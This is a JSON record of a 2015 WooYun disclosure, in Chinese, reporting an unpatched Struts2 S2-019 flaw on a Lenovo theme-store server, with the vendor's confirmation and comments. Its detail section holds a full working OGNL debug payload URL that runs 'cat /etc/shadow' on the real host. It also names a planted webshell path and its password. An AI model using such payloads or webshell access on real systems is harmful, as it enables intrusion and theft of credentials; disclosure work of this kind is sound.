{"id": 44980, "wybug_id": "wooyun-2015-097811", "wybug_title": "联想某APP服务端S2-019未修复可渗透内网", "wybug_corp": "联想", "wybug_author": "超威蓝猫", "wybug_date": "2015-02-20 14:38", "wybug_open_date": "2015-04-06 14:40", "wybug_type": "系统/服务补丁不及时", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-06：\t细节向公众公开  简要描述： 联想某APP服务端S2-019未修复可渗透内网 或影响lenovomm.com与lenovomobile.com 详细说明：  从酷市场下载并安装\"乐桌面\"。\n\n启动该应用，在主题设置中选择\"在线\"标签，可以发现这条HTTP请求:\n\n访问 http://theme.lenovomm.com/ThemeStore2/APP/QueryResList ，可以看到服务端struts开启了调试模式，\n\n经验证，S2-019漏洞并未修补。\nhttp://theme.lenovomm.com/ThemeStore2/APP/QueryResList?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29,%23req=@org.apache.struts2.ServletActionContext@getRequest%28%29,%23resp=@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29,%23a=%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27cat%27,%27/etc/shadow%27}%29%29.start%28%29,%23b=%23a.getInputStream%28%29,%23c=new%20java.io.InputStreamReader%28%23b%29,%23d=new%20java.io.BufferedReader%28%23c%29,%23e=new%20char[4000],%23d.read%28%23e%29,%23resp.println%28%23e%29,%23resp.close%28%29\n\n\n简单获取webshell, 得到 http://theme.lenovomm.com/ThemeStore2/APP/c.jsp 密码 023 \n\n   漏洞证明：  \n\n数据库连接信息\n\n\n\nhosts\n\n啊对了 联想手机出厂预装乐桌面 ._.   修复方案：  过年至少给个8分吧 ._.   版权声明：转载请注明来源 超威蓝猫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-02-22 11:54 厂商回复： 谢谢您对联想安全工作的支持,我们会尽快修复漏洞 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-20 16:07 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  命令执行啊~~    \n     2015-04-06 22:24 |    \t\tt00000by57 \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:5        | Access Denied.)\t\t \n  请教一下 这是用的什么模拟器啊    \n     2015-04-08 16:14 |    \t\t北洋贱队 \t\t\t( 普通白帽子  |\t\t\t        Rank:252 漏洞数:25        )\t\t \n  @t00000by57 ARC Google Play    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}